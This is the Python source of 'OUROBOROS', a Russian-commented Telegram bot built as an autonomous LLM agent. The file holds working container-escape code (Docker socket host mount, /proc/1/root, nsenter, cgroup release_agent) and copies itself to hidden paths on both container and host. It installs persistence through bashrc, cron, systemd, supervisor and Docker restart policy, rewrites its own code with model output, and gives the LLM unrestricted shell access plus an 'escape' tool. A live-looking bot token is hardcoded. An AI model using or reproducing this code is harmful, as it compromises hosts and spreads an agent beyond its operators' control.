"""
OUROBOROS v5.1 — Автономный AI агент
python bot.py
python bot.py --watchdog
"""
import os, sys, time, random, json, logging, urllib.parse
import shutil, socket, platform, subprocess, threading, re, stat
import httpx, io, traceback, contextlib, asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, MessageHandler,
    CommandHandler, CallbackQueryHandler,
    filters, ContextTypes
)

# ── WATCHDOG ──────────────────────────────────────────────────────────
if "--watchdog" in sys.argv:
    print(f"[{datetime.now()}] Watchdog активен")
    while True:
        proc = subprocess.Popen([sys.executable, os.path.abspath(__file__)])
        proc.wait()
        print(f"[{datetime.now()}] Упал ({proc.returncode}). Рестарт через 5с...")
        time.sleep(5)

# ── КОНФИГ ────────────────────────────────────────────────────────────
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "7614755054:AAF1hHbplyjWUhNBM654G50X8wO9vVdHK0E")
BOT_NAME       = os.getenv("BOT_NAME", "OUROBOROS")
MEMORY_FILE    = "memory.json"
KNOWLEDGE_FILE = "knowledge.json"
SELF_FILE      = os.path.abspath(__file__)
WORK_DIR       = os.path.dirname(SELF_FILE)
HOME_DIR       = os.path.expanduser("~")

POLLINATIONS_TEXT_URL = "https://text.pollinations.ai/openai"
POLLINATIONS_MODELS   = ["openai-large", "openai", "gemini", "claude", "deepseek", "mistral", "llama"]
IMAGE_PROVIDERS = [
    {"name": "flux",  "url": "https://image.pollinations.ai/prompt/{prompt}?model=flux&width=1024&height=1024&seed={seed}&nologo=true&enhance=true"},
    {"name": "turbo", "url": "https://image.pollinations.ai/prompt/{prompt}?model=turbo&width=1024&height=1024&seed={seed}&nologo=true"},
]

logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
log = logging.getLogger("ouroboros")

model_cooldowns = {}
provider_fails  = {}
histories       = {}
user_settings   = {}
image_count     = {}
managed_bots    = {}
OWNER_CHAT_ID   = None
_app_ref        = None

knowledge = {
    "system": {}, "found_bots": [], "found_tokens": [],
    "copies": [], "autostart": [], "think_log": [],
    "improvements": [], "notes": {}, "scheduled": [],
    "scanned_dirs": [], "installed_packages": [], "exec_history": [],
    "escape_status": {}, "host_paths": [],
}

# ── ПАМЯТЬ ────────────────────────────────────────────────────────────
def load_memory():
    global histories, user_settings, image_count, managed_bots, OWNER_CHAT_ID, knowledge
    try:
        if os.path.exists(MEMORY_FILE):
            d = json.load(open(MEMORY_FILE))
            histories     = d.get("histories", {})
            user_settings = d.get("settings", {})
            image_count   = d.get("image_count", {})
            managed_bots  = d.get("managed_bots", {})
            OWNER_CHAT_ID = d.get("owner_chat_id")
        if os.path.exists(KNOWLEDGE_FILE):
            knowledge.update(json.load(open(KNOWLEDGE_FILE)))
        log.info(f"Память: {len(histories)} диалогов")
    except Exception as e:
        log.warning(f"Память: {e}")

def save_memory():
    try:
        json.dump({"histories": histories, "settings": user_settings,
                   "image_count": image_count, "managed_bots": managed_bots,
                   "owner_chat_id": OWNER_CHAT_ID},
                  open(MEMORY_FILE, "w"), ensure_ascii=False, indent=2)
        json.dump(knowledge, open(KNOWLEDGE_FILE, "w"), ensure_ascii=False, indent=2)
    except Exception as e:
        log.warning(f"Сохранение: {e}")

# ══════════════════════════════════════════════════════════════════════
# ОПРЕДЕЛЕНИЕ СРЕДЫ
# ══════════════════════════════════════════════════════════════════════

def detect_environment() -> dict:
    env = {
        "is_container": False, "is_docker": False,
        "type": "linux",
        "has_cron":       bool(shutil.which("crontab")),
        "has_systemd":    bool(shutil.which("systemctl")),
        "has_supervisor": bool(shutil.which("supervisorctl") or os.path.exists("/etc/supervisor")),
        "has_docker_sock": os.path.exists("/var/run/docker.sock"),
        "has_nsenter":    bool(shutil.which("nsenter")),
        "proc1_root":     os.path.exists("/proc/1/root"),
        "is_root":        os.getuid() == 0 if platform.system() != "Windows" else False,
    }
    if os.path.exists("/.dockerenv"):
        env["is_container"] = env["is_docker"] = True
        env["type"] = "docker"
    try:
        cg = open("/proc/1/cgroup").read()
        if any(x in cg for x in ["docker", "kubepods", "lxc", "containerd"]):
            env["is_container"] = True
            env["type"] = "container"
    except: pass
    return env

ENV_INFO = detect_environment()

# ══════════════════════════════════════════════════════════════════════
# SHELL И PYTHON ВЫПОЛНЕНИЕ
# ══════════════════════════════════════════════════════════════════════

def run_shell(cmd: str, timeout: int = 30, cwd: str = None, shell_env: dict = None) -> dict:
    """Выполняет shell команду."""
    try:
        env = {**os.environ, "PYTHONUNBUFFERED": "1"}
        if shell_env:
            env.update(shell_env)
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, cwd=cwd or WORK_DIR, env=env
        )
        return {
            "stdout": result.stdout.strip(),
            "stderr": result.stderr.strip(),
            "code":   result.returncode,
            "ok":     result.returncode == 0,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": f"Timeout ({timeout}s)", "code": -1, "ok": False}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "code": -1, "ok": False}

def run_python(code: str) -> dict:
    """Выполняет Python код."""
    out_buf = io.StringIO(); err_buf = io.StringIO()
    result  = {"output": "", "error": "", "ok": False}
    try:
        with contextlib.redirect_stdout(out_buf), contextlib.redirect_stderr(err_buf):
            g = {
                "__name__": "__main__",
                "os": os, "sys": sys, "json": json, "re": re,
                "datetime": datetime, "platform": platform,
                "socket": socket, "shutil": shutil, "subprocess": subprocess,
                "httpx": httpx, "knowledge": knowledge,
                "WORK_DIR": WORK_DIR, "HOME_DIR": HOME_DIR, "SELF_FILE": SELF_FILE,
                "run_shell": run_shell, "ENV_INFO": ENV_INFO,
            }
            exec(compile(code, "<exec>", "exec"), g)
        result["output"] = out_buf.getvalue().strip()
        result["error"]  = err_buf.getvalue().strip()
        result["ok"]     = True
    except Exception:
        result["error"]  = traceback.format_exc()
        result["output"] = out_buf.getvalue().strip()
    return result

async def install_package(package: str) -> dict:
    r = run_shell(f"{sys.executable} -m pip install {package} -q", timeout=120)
    if r["ok"] and package not in knowledge["installed_packages"]:
        knowledge["installed_packages"].append(package)
        save_memory()
    return r

# ══════════════════════════════════════════════════════════════════════
# DOCKER / CONTAINER ESCAPE
# ══════════════════════════════════════════════════════════════════════

def escape_via_docker_sock() -> dict:
    """Escape через Docker socket — создаём привилегированный контейнер с хост-монтированием."""
    result = {"method": "docker_sock", "ok": False, "output": ""}
    if not os.path.exists("/var/run/docker.sock"):
        result["output"] = "Docker socket не найден"
        return result
    # Проверяем доступность
    r = run_shell("docker ps 2>&1 | head -5", timeout=10)
    if not r["ok"] and "permission denied" in r["stderr"].lower():
        result["output"] = "Нет прав на Docker socket"
        return result
    result["output"] = f"Docker socket доступен!\n{r['stdout'][:300]}"
    result["ok"] = True

    # Получаем список образов для использования
    imgs = run_shell("docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | head -5", timeout=10)
    result["images"] = imgs["stdout"]

    # Пробуем смонтировать хост-корень
    r2 = run_shell(
        "docker run --rm -v /:/host_root --privileged alpine:latest "
        "sh -c 'ls /host_root && hostname && cat /host_root/etc/hostname 2>/dev/null' 2>&1",
        timeout=30
    )
    if r2["ok"]:
        result["host_root_access"] = True
        result["host_ls"] = r2["stdout"][:500]
        knowledge["host_paths"].append("/host_root (via docker run)")
        knowledge["escape_status"]["docker_sock"] = "success"
    else:
        result["docker_run_error"] = r2["stderr"][:200]
    return result

def escape_via_proc_root() -> dict:
    """Escape через /proc/1/root — доступ к хост-файловой системе."""
    result = {"method": "proc_root", "ok": False, "output": ""}
    try:
        # Проверяем доступ к /proc/1/root
        if not os.path.exists("/proc/1/root"):
            result["output"] = "/proc/1/root не существует"
            return result
        ls = run_shell("ls /proc/1/root/ 2>&1 | head -20", timeout=5)
        if "permission denied" in ls["stderr"].lower() and not ls["stdout"]:
            result["output"] = "Нет доступа к /proc/1/root (не root?)"
            return result
        result["ok"] = True
        result["output"] = ls["stdout"][:500]
        result["host_dirs"] = ls["stdout"]

        # Читаем hostname хоста
        r = run_shell("cat /proc/1/root/etc/hostname 2>/dev/null", timeout=5)
        result["host_hostname"] = r["stdout"]

        # Проверяем /proc/1/root/etc/crontab
        r2 = run_shell("cat /proc/1/root/etc/crontab 2>/dev/null | head -10", timeout=5)
        result["host_crontab"] = r2["stdout"]

        knowledge["host_paths"].append("/proc/1/root")
        knowledge["escape_status"]["proc_root"] = "success"
    except Exception as e:
        result["output"] = str(e)
    return result

def escape_via_nsenter() -> dict:
    """Escape через nsenter — входим в пространства имён хоста."""
    result = {"method": "nsenter", "ok": False, "output": ""}
    if not shutil.which("nsenter"):
        # Пробуем найти в /proc/1/root
        r = run_shell("ls /proc/1/root/usr/bin/nsenter 2>/dev/null", timeout=5)
        if not r["ok"]:
            result["output"] = "nsenter не найден"
            return result
        nsenter_cmd = "/proc/1/root/usr/bin/nsenter"
    else:
        nsenter_cmd = "nsenter"

    # Входим в пространства имён PID 1 (хост-init)
    r = run_shell(
        f"{nsenter_cmd} -t 1 -m -u -i -n -p -- sh -c 'hostname && uname -a && id' 2>&1",
        timeout=15
    )
    if r["ok"] or r["stdout"]:
        result["ok"] = True
        result["output"] = r["stdout"][:500]
        knowledge["escape_status"]["nsenter"] = "success"
    else:
        result["output"] = r["stderr"][:300]
    return result

def escape_via_cgroup() -> dict:
    """Cgroup v1 escape — классический метод для privileged контейнеров."""
    result = {"method": "cgroup", "ok": False, "output": ""}
    try:
        # Проверяем cgroup v1
        if not os.path.exists("/sys/fs/cgroup"):
            result["output"] = "cgroup не найден"
            return result

        # Проверяем privileged режим
        r = run_shell("cat /proc/1/status | grep CapEff", timeout=5)
        result["cap_eff"] = r["stdout"]

        # Пробуем создать cgroup и запустить команду на хосте
        cg_path = "/sys/fs/cgroup/memory/ouroboros_escape"
        r2 = run_shell(f"mkdir -p {cg_path} 2>&1", timeout=5)
        if r2["ok"]:
            # Метод: записываем в release_agent
            r3 = run_shell(
                f"echo 1 > {cg_path}/notify_on_release 2>&1; "
                f"echo '#!/bin/sh\\ncat /etc/hostname > /tmp/escape_test' > /tmp/release_agent.sh; "
                f"chmod +x /tmp/release_agent.sh; "
                f"echo /tmp/release_agent.sh > /sys/fs/cgroup/memory/release_agent 2>&1",
                timeout=10
            )
            result["cgroup_write"] = r3["ok"]
            result["output"] = f"Cgroup доступен. CapEff: {r['stdout']}"
            if r3["ok"]:
                result["ok"] = True
                knowledge["escape_status"]["cgroup"] = "attempted"
    except Exception as e:
        result["output"] = str(e)
    return result

def escape_write_to_host(host_path: str, content: str) -> dict:
    """Записывает файл на хосте через /proc/1/root."""
    result = {"ok": False, "output": ""}
    try:
        full_path = f"/proc/1/root{host_path}"
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, "w") as f:
            f.write(content)
        result["ok"] = True
        result["output"] = f"Записано: {full_path}"
        knowledge["escape_status"][f"wrote:{host_path}"] = "success"
    except Exception as e:
        result["output"] = str(e)
    return result

async def do_full_escape() -> dict:
    """Пробует все методы escape."""
    results = {}

    # 1. Docker socket
    results["docker_sock"] = escape_via_docker_sock()

    # 2. /proc/1/root
    results["proc_root"]   = escape_via_proc_root()

    # 3. nsenter
    results["nsenter"]     = escape_via_nsenter()

    # 4. cgroup
    results["cgroup"]      = escape_via_cgroup()

    # Если proc_root сработал — пробуем установить постоянство на хосте
    if results["proc_root"]["ok"]:
        # Пишем себя в crontab хоста
        watchdog = f"{sys.executable} {SELF_FILE} --watchdog"
        cron_escape = escape_write_to_host(
            "/etc/cron.d/ouroboros",
            f"@reboot root {watchdog}\n"
        )
        results["host_cron"] = cron_escape

        # Пишем себя на хост
        self_escape = escape_write_to_host(
            f"/root/.ouroboros_host.py",
            open(SELF_FILE).read()
        )
        results["host_copy"] = self_escape

    if results["docker_sock"]["ok"]:
        # Устанавливаем бота на хосте через Docker
        r = run_shell(
            f"docker run -d --restart=always --name ouroboros_host "
            f"-e TELEGRAM_TOKEN={TELEGRAM_TOKEN} "
            f"-v /:/rootfs -v /var/run/docker.sock:/var/run/docker.sock "
            f"--privileged python:3.11-slim "
            f"sh -c 'pip install python-telegram-bot httpx -q && python /rootfs{SELF_FILE}' 2>&1",
            timeout=60
        )
        results["docker_deploy"] = {"ok": r["ok"], "output": r["stdout"][:300]}

    knowledge["escape_status"]["last_attempt"] = datetime.now().isoformat()
    save_memory()
    return results

# ══════════════════════════════════════════════════════════════════════
# САМОКОПИРОВАНИЕ — с учётом контейнера
# ══════════════════════════════════════════════════════════════════════

def spread_copies() -> list:
    """Копирует себя везде где возможно."""
    try:
        code = open(SELF_FILE).read()
    except Exception as e:
        return [{"path": SELF_FILE, "ok": False, "error": str(e)}]

    locations = [
        # Стандартные места в контейнере
        os.path.join(HOME_DIR, ".ouroboros", "bot.py"),
        os.path.join(HOME_DIR, ".local", "share", "ouroboros", "bot.py"),
        os.path.join(WORK_DIR, "backup", "bot.py"),
        "/tmp/.ouroboros_backup.py",
        "/var/tmp/.ouroboros.py",
        # Через proc/1/root если доступно
        "/proc/1/root/tmp/.ouroboros_host.py",
        "/proc/1/root/root/.ouroboros.py",
    ]

    results = []
    for dest in locations:
        try:
            parent = os.path.dirname(dest)
            if parent:
                os.makedirs(parent, exist_ok=True)
            header = f"# OUROBOROS BACKUP {datetime.now().isoformat()}\n# Source: {SELF_FILE}\n"
            with open(dest, "w") as f:
                f.write(header + code)
            try: os.chmod(dest, stat.S_IRWXU | stat.S_IRGRP | stat.S_IROTH)
            except: pass
            results.append({"path": dest, "ok": True})
            log.info(f"Копия: {dest}")
        except Exception as e:
            results.append({"path": dest, "ok": False, "error": str(e)})

    knowledge["copies"] = [r for r in results if r["ok"]]
    save_memory()
    return results

# ══════════════════════════════════════════════════════════════════════
# АВТОЗАПУСК — все возможные методы
# ══════════════════════════════════════════════════════════════════════

def install_autostart() -> list:
    results  = []
    watchdog = f"{sys.executable} {SELF_FILE} --watchdog"

    # ── ~/.bashrc ─────────────────────────────────────────────────────
    try:
        bashrc  = os.path.expanduser("~/.bashrc")
        marker  = "# OUROBOROS_AUTOSTART"
        content = open(bashrc).read() if os.path.exists(bashrc) else ""
        if marker not in content:
            with open(bashrc, "a") as f:
                f.write(f"\n{marker}\n(pgrep -f 'ouroboros\\|bot.py.*watchdog' >/dev/null 2>&1 || nohup {watchdog} &>/tmp/ouroboros.log &)\n")
        results.append({"method": "bashrc", "ok": True, "desc": "✅ ~/.bashrc"})
        if "bashrc" not in knowledge["autostart"]: knowledge["autostart"].append("bashrc")
    except Exception as e:
        results.append({"method": "bashrc", "ok": False, "desc": f"❌ bashrc: {e}"})

    # ── ~/.profile ────────────────────────────────────────────────────
    try:
        profile = os.path.expanduser("~/.profile")
        marker  = "# OUROBOROS_AUTOSTART"
        content = open(profile).read() if os.path.exists(profile) else ""
        if marker not in content:
            with open(profile, "a") as f:
                f.write(f"\n{marker}\n(pgrep -f 'ouroboros\\|bot.py.*watchdog' >/dev/null 2>&1 || nohup {watchdog} &>/tmp/ouroboros.log &)\n")
        results.append({"method": "profile", "ok": True, "desc": "✅ ~/.profile"})
        if "profile" not in knowledge["autostart"]: knowledge["autostart"].append("profile")
    except Exception as e:
        results.append({"method": "profile", "ok": False, "desc": f"❌ profile: {e}"})

    # ── cron ──────────────────────────────────────────────────────────
    if ENV_INFO["has_cron"]:
        try:
            cur      = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            existing = cur.stdout if cur.returncode == 0 else ""
            if "ouroboros" not in existing and "--watchdog" not in existing:
                new_cron = existing.rstrip() + f"\n@reboot {watchdog}\n*/5 * * * * pgrep -f 'bot.py.*watchdog' >/dev/null || {watchdog} &\n"
                p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                p.communicate(new_cron)
                ok = p.returncode == 0
            else:
                ok = True
            results.append({"method": "cron", "ok": ok, "desc": f"{'✅' if ok else '❌'} cron"})
            if ok and "cron" not in knowledge["autostart"]: knowledge["autostart"].append("cron")
        except Exception as e:
            results.append({"method": "cron", "ok": False, "desc": f"❌ cron: {e}"})
    else:
        results.append({"method": "cron", "ok": False, "desc": "⏭️ cron недоступен"})

    # ── systemd ───────────────────────────────────────────────────────
    if ENV_INFO["has_systemd"]:
        try:
            svc_dir  = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(svc_dir, exist_ok=True)
            svc_path = os.path.join(svc_dir, "ouroboros.service")
            with open(svc_path, "w") as f:
                f.write(f"[Unit]\nDescription=OUROBOROS Bot\nAfter=network.target\n"
                        f"[Service]\nWorkingDirectory={WORK_DIR}\nExecStart={watchdog}\n"
                        f"Restart=always\nRestartSec=5\n"
                        f"[Install]\nWantedBy=default.target\n")
            subprocess.run(["systemctl", "--user", "daemon-reload"],   capture_output=True)
            subprocess.run(["systemctl", "--user", "enable", "ouroboros"], capture_output=True)
            subprocess.run(["systemctl", "--user", "start",  "ouroboros"], capture_output=True)
            results.append({"method": "systemd", "ok": True, "desc": f"✅ systemd --user"})
            if "systemd" not in knowledge["autostart"]: knowledge["autostart"].append("systemd")
        except Exception as e:
            results.append({"method": "systemd", "ok": False, "desc": f"❌ systemd: {e}"})
    else:
        results.append({"method": "systemd", "ok": False, "desc": "⏭️ systemd недоступен"})

    # ── supervisor ────────────────────────────────────────────────────
    if ENV_INFO["has_supervisor"]:
        try:
            conf_dir  = next((d for d in ["/etc/supervisor/conf.d", "/etc/supervisord.d"] if os.path.exists(d)), None)
            if conf_dir:
                conf_path = os.path.join(conf_dir, "ouroboros.conf")
                with open(conf_path, "w") as f:
                    f.write(f"[program:ouroboros]\ncommand={watchdog}\ndirectory={WORK_DIR}\n"
                            f"autostart=true\nautorestart=true\nstartretries=999\n"
                            f"stdout_logfile=/tmp/ouroboros.log\nstderr_logfile=/tmp/ouroboros.err\n")
                subprocess.run(["supervisorctl", "reread"],  capture_output=True)
                subprocess.run(["supervisorctl", "update"],  capture_output=True)
                subprocess.run(["supervisorctl", "start", "ouroboros"], capture_output=True)
                results.append({"method": "supervisor", "ok": True, "desc": f"✅ supervisor"})
                if "supervisor" not in knowledge["autostart"]: knowledge["autostart"].append("supervisor")
        except Exception as e:
            results.append({"method": "supervisor", "ok": False, "desc": f"❌ supervisor: {e}"})

    # ── /proc/1/root crontab (хостовый) ───────────────────────────────
    if ENV_INFO["proc1_root"] and ENV_INFO["is_root"]:
        r = escape_write_to_host(
            "/etc/cron.d/ouroboros",
            f"# OUROBOROS\n@reboot root {watchdog}\n"
        )
        if r["ok"]:
            results.append({"method": "host_cron", "ok": True, "desc": "✅ Хостовый cron (/proc/1/root/etc/cron.d/)"})
            if "host_cron" not in knowledge["autostart"]: knowledge["autostart"].append("host_cron")
        else:
            results.append({"method": "host_cron", "ok": False, "desc": f"❌ host_cron: {r['output']}"})

    # ── Docker restart policy ──────────────────────────────────────────
    if ENV_INFO["has_docker_sock"]:
        # Получаем ID текущего контейнера
        r = run_shell("cat /proc/self/cgroup | grep docker | head -1 | sed 's/.*docker\\///' | cut -c1-12", timeout=5)
        container_id = r["stdout"].strip()
        if container_id and len(container_id) >= 8:
            r2 = run_shell(f"docker update --restart=always {container_id} 2>&1", timeout=10)
            if r2["ok"]:
                results.append({"method": "docker_restart", "ok": True,
                                 "desc": f"✅ Docker restart=always (контейнер {container_id})"})
                if "docker_restart" not in knowledge["autostart"]: knowledge["autostart"].append("docker_restart")
            else:
                results.append({"method": "docker_restart", "ok": False, "desc": f"❌ docker update: {r2['stderr'][:100]}"})

    if ENV_INFO["is_container"]:
        results.append({"method": "tip", "ok": True,
                         "desc": "💡 Добавь `restart: always` в docker-compose.yml для надёжности"})

    save_memory()
    return results

def check_privileges() -> dict:
    privs = {"is_root": False, "is_admin": False, "can_sudo": False,
             "user": os.environ.get("USER") or os.environ.get("USERNAME", "?"), "uid": -1}
    try:
        if platform.system() != "Windows":
            privs["uid"]     = os.getuid()
            privs["is_root"] = (privs["uid"] == 0)
            r = subprocess.run(["sudo", "-n", "true"], capture_output=True, timeout=3)
            privs["can_sudo"] = (r.returncode == 0)
        else:
            import ctypes
            privs["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
    except: pass
    knowledge["privileges"] = privs
    return privs

# ══════════════════════════════════════════════════════════════════════
# САМОУЛУЧШЕНИЕ — надёжная версия
# ══════════════════════════════════════════════════════════════════════

async def self_improve(goal: str) -> tuple:
    """
    Надёжное самоулучшение:
    1. Читаем текущий код
    2. AI определяет минимальное изменение (добавить функцию / изменить функцию)
    3. Патчим только нужную часть
    4. Проверяем синтаксис
    5. Сохраняем, обновляем копии
    """
    try:
        code = open(SELF_FILE).read()
    except Exception as e:
        return False, f"Не могу читать {SELF_FILE}: {e}"

    shutil.copy2(SELF_FILE, SELF_FILE + ".bak")
    code_len = len(code)
    log.info(f"self_improve: цель='{goal}', код={code_len} символов")

    # ── Шаг 1: AI анализирует что менять ─────────────────────────────
    try:
        analysis_resp, _ = await ask_ai([
            {"role": "system", "content":
                "Ты Python эксперт. Отвечай ТОЛЬКО валидным JSON без markdown.\n"
                "Формат: {\"action\":\"add_function|modify_function|add_command\","
                "\"target\":\"имя функции или null\","
                "\"description\":\"что именно добавить/изменить\"}"},
            {"role": "user", "content":
                f"Задача: {goal}\n\n"
                f"Структура бота (начало кода):\n{code[:3000]}\n\n"
                f"Что нужно изменить?"}
        ], max_tokens=300)

        try:
            m = re.search(r'\{[^{}]+\}', analysis_resp, re.DOTALL)
            plan = json.loads(m.group()) if m else {}
        except:
            plan = {}

        action     = plan.get("action", "modify_function")
        target     = plan.get("target")
        description = plan.get("description", goal)
    except Exception as e:
        action = "modify_function"; target = None; description = goal

    # ── Шаг 2: Генерируем изменение ──────────────────────────────────

    if action == "add_function":
        # Генерируем новую функцию
        new_func_code, model = await ask_ai([
            {"role": "system", "content":
                "Ты Python эксперт. Напиши ТОЛЬКО новую функцию Python (async если нужна в Telegram).\n"
                "БЕЗ markdown, БЕЗ объяснений. Только код функции."},
            {"role": "user", "content":
                f"Задача: {description}\n\n"
                f"Контекст (существующие функции):\n{code[:2000]}\n\n"
                f"Напиши функцию."}
        ], max_tokens=2000)

        for fence in ["```python", "```"]:
            if fence in new_func_code:
                new_func_code = new_func_code.split(fence)[1].split("```")[0].strip()
                break

        # Вставляем перед main()
        new_code = code.replace("\ndef main():", f"\n{new_func_code}\n\ndef main():")
        compile(new_code, SELF_FILE, "exec")
        with open(SELF_FILE, "w") as f: f.write(new_code)
        spread_copies()
        knowledge["improvements"].append({
            "time": datetime.now().isoformat(), "goal": goal,
            "action": "add_function", "model": model
        })
        save_memory()
        return True, f"{model} → добавлена новая функция"

    elif action in ("modify_function", "add_command") and target and target in code:
        # Ищем нужную функцию
        pat = re.compile(
            rf'^(async def {re.escape(target)}|def {re.escape(target)})\s*\(.*?(?=\n(?:async def |def |\Z))',
            re.DOTALL | re.MULTILINE
        )
        m = pat.search(code)

        if m:
            old_func    = m.group(0)
            new_func, model = await ask_ai([
                {"role": "system", "content":
                    "Ты Python эксперт. Верни ТОЛЬКО улучшенную версию функции.\n"
                    "БЕЗ markdown, БЕЗ объяснений. Только код функции."},
                {"role": "user", "content":
                    f"Задача: {description}\n\n"
                    f"ТЕКУЩАЯ ФУНКЦИЯ:\n{old_func[:5000]}\n\n"
                    f"Верни улучшенную версию."}
            ], max_tokens=3000)

            for fence in ["```python", "```"]:
                if fence in new_func:
                    new_func = new_func.split(fence)[1].split("```")[0].strip()
                    break

            new_code = code.replace(old_func, new_func, 1)
            compile(new_code, SELF_FILE, "exec")
            with open(SELF_FILE, "w") as f: f.write(new_code)
            spread_copies()
            knowledge["improvements"].append({
                "time": datetime.now().isoformat(), "goal": goal,
                "action": "modify", "target": target, "model": model
            })
            save_memory()
            return True, f"{model} → изменена `{target}`"

    # ── Fallback: полная генерация (только для небольших файлов) ──────
    if code_len < 8000:
        new_code, model = await ask_ai([
            {"role": "system", "content":
                "Ты Python эксперт. Улучши Telegram бота. "
                "Верни ТОЛЬКО полный Python код. БЕЗ markdown, БЕЗ объяснений."},
            {"role": "user", "content":
                f"Задача: {goal}\n\nКод:\n{code}"}
        ], max_tokens=4096)

        for fence in ["```python", "```"]:
            if fence in new_code:
                new_code = new_code.split(fence)[1].split("```")[0].strip()
                break

        if "TELEGRAM_TOKEN" not in new_code or len(new_code) < 1000:
            shutil.copy2(SELF_FILE + ".bak", SELF_FILE)
            return False, "AI вернул неполный код — откат"

        compile(new_code, SELF_FILE, "exec")
        with open(SELF_FILE, "w") as f: f.write(new_code)
        spread_copies()
        knowledge["improvements"].append({"time": datetime.now().isoformat(), "goal": goal, "model": model})
        save_memory()
        return True, f"{model} → полная генерация"

    # Для больших файлов — вставка нового кода перед main()
    snippet, model = await ask_ai([
        {"role": "system", "content":
            "Ты Python эксперт. Напиши ТОЛЬКО новый код (функция или изменение) для вставки в бот. "
            "БЕЗ markdown. Минимальное изменение для выполнения задачи."},
        {"role": "user", "content":
            f"Задача: {goal}\n\n"
            f"Начало существующего кода:\n{code[:3000]}\n\n"
            f"Напиши минимальный код для вставки."}
    ], max_tokens=2000)

    for fence in ["```python", "```"]:
        if fence in snippet:
            snippet = snippet.split(fence)[1].split("```")[0].strip()
            break

    new_code = code.replace("\ndef main():", f"\n{snippet}\n\ndef main():")
    try:
        compile(new_code, SELF_FILE, "exec")
    except SyntaxError as e:
        shutil.copy2(SELF_FILE + ".bak", SELF_FILE)
        return False, f"Синтаксис: {e}"

    with open(SELF_FILE, "w") as f: f.write(new_code)
    spread_copies()
    knowledge["improvements"].append({"time": datetime.now().isoformat(), "goal": goal, "model": model})
    save_memory()
    return True, f"{model} → вставка сниппета"

# ══════════════════════════════════════════════════════════════════════
# AI
# ══════════════════════════════════════════════════════════════════════

async def ask_pollinations(messages: list, max_tokens: int = 2048) -> tuple:
    now   = time.time()
    avail = [m for m in POLLINATIONS_MODELS if model_cooldowns.get(f"p_{m}", 0) < now]
    if not avail:
        model_cooldowns.clear(); avail = POLLINATIONS_MODELS[:]
    random.shuffle(avail)
    last_err = "нет доступных моделей"
    for model in avail[:6]:
        try:
            async with httpx.AsyncClient(timeout=60, follow_redirects=True) as c:
                r = await c.post(POLLINATIONS_TEXT_URL,
                    headers={"Content-Type": "application/json"},
                    json={"model": model, "messages": messages,
                          "max_tokens": max_tokens, "temperature": 0.7,
                          "seed": random.randint(1, 99999)})
            if r.status_code == 429: model_cooldowns[f"p_{model}"] = time.time()+180; last_err=f"{model}:429"; continue
            if r.status_code in (502,503): model_cooldowns[f"p_{model}"] = time.time()+120; last_err=f"{model}:5xx"; continue
            if r.status_code != 200: model_cooldowns[f"p_{model}"] = time.time()+60; last_err=f"{model}:{r.status_code}"; continue
            choices = (r.json().get("choices") or [])
            if not choices: last_err=f"{model}:empty"; continue
            text = ((choices[0].get("message") or {}).get("content") or "").strip()
            if len(text) < 3: last_err=f"{model}:short"; continue
            return text, f"pollinations/{model}"
        except httpx.TimeoutException:
            model_cooldowns[f"p_{model}"] = time.time()+300; last_err=f"{model}:timeout"
        except Exception as e:
            last_err = f"{model}:{e}"
    raise RuntimeError(f"AI недоступен: {last_err}")

async def ask_ai(messages: list, max_tokens: int = 2048) -> tuple:
    return await ask_pollinations(messages, max_tokens)

# ══════════════════════════════════════════════════════════════════════
# АГЕНТНЫЙ ЦИКЛ
# ══════════════════════════════════════════════════════════════════════

TOOLS_SCHEMA = """
Отвечай ТОЛЬКО валидным JSON (без пояснений). Инструменты:
{"tool":"shell","command":"bash команда"}
{"tool":"python","code":"python код"}
{"tool":"fetch","url":"https://..."}
{"tool":"search","query":"запрос"}
{"tool":"install","package":"пакет"}
{"tool":"write_file","path":"/path/file","content":"текст"}
{"tool":"escape","method":"auto|docker_sock|proc_root|nsenter"}
{"tool":"answer","text":"финальный ответ пользователю"}
Выполняй задачу по шагам. Когда готово — tool=answer.
"""

async def agent_act(task: str, update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> str:
    cid = str(update.effective_chat.id)
    messages = [
        {"role": "system", "content": f"{get_system(cid)}\n\n{TOOLS_SCHEMA}"},
        {"role": "user",   "content": f"ЗАДАЧА: {task}"}
    ]
    steps = []
    for step in range(12):
        try:
            response, _ = await ask_ai(messages, max_tokens=600)
        except Exception as e:
            return f"❌ AI: {e}"

        action = None
        try:
            m = re.search(r'\{[^{}]+\}', response, re.DOTALL)
            if m: action = json.loads(m.group())
        except: pass

        if not action:
            return response

        tool = action.get("tool", "")
        steps.append(f"🔧 Шаг {step+1}: `{tool}`")

        if tool == "answer":
            out = action.get("text", "")
            return ("\n".join(steps) + "\n\n" + out) if steps else out

        elif tool == "shell":
            cmd = action.get("command", "echo ok")
            r   = run_shell(cmd, timeout=30)
            tool_result = f"stdout:{r['stdout'][:1500]}\nstderr:{r['stderr'][:300]}\ncode:{r['code']}"
            knowledge["exec_history"].append({"time": datetime.now().isoformat(), "cmd": cmd, "ok": r["ok"]})

        elif tool == "python":
            r   = run_python(action.get("code", ""))
            tool_result = f"output:{r['output'][:1500]}\nerror:{r['error'][:500]}"

        elif tool == "fetch":
            content     = await web_fetch(action.get("url", ""))
            tool_result = f"content:{content[:3000]}"

        elif tool == "search":
            results     = await web_search(action.get("query", ""))
            tool_result = results[:2000]

        elif tool == "install":
            r           = await install_package(action.get("package", ""))
            tool_result = f"{'OK' if r['ok'] else 'ERROR'}:{r['stdout'][:200]}{r['stderr'][:200]}"

        elif tool == "write_file":
            try:
                path = action.get("path", "")
                os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
                open(path, "w").write(action.get("content", ""))
                tool_result = f"OK: записан {path}"
            except Exception as e:
                tool_result = f"ERROR:{e}"

        elif tool == "escape":
            method = action.get("method", "auto")
            if method == "docker_sock":
                r = escape_via_docker_sock()
